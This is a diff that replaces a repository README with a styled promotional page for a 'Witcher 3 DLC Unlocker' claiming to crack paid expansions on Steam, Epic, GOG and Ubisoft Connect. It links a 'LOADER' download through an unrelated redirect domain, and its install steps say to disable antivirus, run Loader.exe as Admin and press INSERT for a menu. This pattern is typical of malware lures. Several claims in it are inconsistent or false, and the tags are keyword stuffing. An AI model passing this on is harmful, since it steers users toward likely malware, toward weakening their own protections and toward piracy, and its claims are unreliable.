@@ -1,2 +1,25 @@
-# The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-
-The Witcher 3 DLC Unlocker – Cross‑Platform (Koalageddon &amp; ScreamAPI)
+<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
+<h1 style="color:#ffaa66;border-bottom:2px solid #dd8844;text-align:center;">🌐 The Witcher 3 DLC Unlocker – Cross‑Platform (Koalageddon & ScreamAPI) 🌐</h1>
+<p style="font-size:1.1em;text-align:center;"><strong>Steam, Epic Games Store, Ubisoft Connect – one tool unlocks DLCs on all platforms.</strong> Koalageddon R2 works across multiple platforms simultaneously, while ScreamAPI handles Epic‑specific DLC unlocking. Unlocks Hearts of Stone, Blood and Wine, and the entire 16‑piece free DLC collection regardless of where you bought the base game.</p>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#ffaa66;color:#000;padding:12px 25px;">⬇️ DOWNLOAD CROSS‑PLATFORM UNLOCKER (LOADER)</a><p>✅ Steam + Epic + Ubisoft ✅ Koalageddon R2 ✅ ScreamAPI ✅ GUI configuration</p></div>
+<img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/378649/48e242724931e89a71474b9f5ca080243e3ac772/header.jpg?t=1768304100" style="max-width:100%;border-radius:8px;margin:15px 0;">
+<div><h3>🎮 What This Unlocker Covers (All Platforms):</h3>
+<ul><li><strong>Hearts of Stone & Blood and Wine:</strong> Both major expansions – including the runewright, mutation system, grandmaster gear, Toussaint, Olgierd von Everec and Gaunter O’Dimmel.</li>
+<li><strong>16 Free DLCs:</strong> The complete free DLC program from CD Projekt RED, including alternate outfits for Yennefer, Triss and Ciri; new finisher animations; the New Game+ mode; the Temerian and Nilfgaardian armour sets; "Fool’s Gold" and "Scavenger Hunt: Wolf School Gear" quests; Gwent card sets; and more.</li>
+<li><strong>Platform‑exclusive content:</strong> Unlocks console‑exclusive items, Twitch Drop rewards, Developer giveaways, and pre‑order bonuses, regardless of which platform you originally bought the game on.</li></ul>
+<h3>⚙️ How Koalageddon & ScreamAPI Work:</h3>
+<ul><li><strong>Koalageddon R2 (multi‑platform):</strong> A GUI‑based tool that supports Steam, Epic, EA Desktop, Ubisoft Connect and GOG. It uses a dynamic library that monitors DRM DLLs and applies DLC unlocks across all selected platforms with one‑click toggles.</li>
+<li><strong>ScreamAPI (Epic Games Store):</strong> A standalone unlocker specifically designed for Epic Games Store titles. It works through DLL injection and a scream_api.json configuration file, designed to handle Epic’s proprietary authentication layer.</li>
+<li><strong>Works on The Witcher 3 regardless of storefront:</strong> Whether you bought the base game on Steam, received it for free on Epic, or claimed it through GOG – this pack will unlock all DLCs regardless.</li>
+<li><strong>Platform‑agnostic save compatibility:</strong> Save files remain fully compatible across unlocked versions, so you can switch between Steam and Epic without losing progress.</li></ul>
+<h3>🔄 Which Unlocker to Use for Your Platform:</h3>
+<ul><li><strong>Steam users:</strong> Koalageddon R2 is the easiest choice (GUI toggle). Advanced users may prefer CreamAPI or SmokeAPI, both included.</li>
+<li><strong>Epic Games Store users:</strong> ScreamAPI is your recommended option; Koalageddon also works but may require a restart after toggling DLCs.</li>
+<li><strong>GOG & Ubisoft Connect users:</strong> Koalageddon R2 is fully compatible with both platforms.</li>
+<li><strong>Multiple library users (mix of platforms):</strong> The tools can be installed simultaneously; they target different directories and do not conflict with each other.</li></ul>
+<p><strong>Important – In‑Game Activation of DLCs:</strong> After installation, some DLC content may not appear until you reach specific points in the game. The New Game+ mode only unlocks after completing the main story. The runewright appears after starting Hearts of Stone, and the mutation system only activates during the "Turn and Face the Strange" quest in Blood and Wine. This is normal – the DLCs are loaded, and the game triggers them according to its own quest logic.<br>Additionally, the in‑game Downloadable Content menu will show all 16 free DLCs as “installed”. You can verify they are active by checking this menu from the main title screen.</p>
+<h3>⚙️ System Requirements:</h3><p>Windows 10/11, The Witcher 3: Wild Hunt installed (any storefront), .NET 7.0 (automatically installed by tools if missing), 200 MB free space.</p>
+<h3>📥 Installation:</h3>
+<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
+<div><strong>Tags:</strong> witcher 3 cross platform dlc unlocker, koalageddon the witcher 3, screamapi witcher 3 epic games, the witcher 3 dlc unlocker steam epic gog, witcher 3 epic games dlc unlock, witcher 3 gog galaxy dlc unlock, ubisoft connect witcher 3 dlc unlock, multi platform witcher 3 dlc unlocker, witcher 3 unlock on any storefront, witcher 3 cross save dlc unlock, witcher 3 free dlc program unlock, the witcher 3 base game no dlc bought, witcher 3 share save between platforms dlc unlock</div>
+</div>
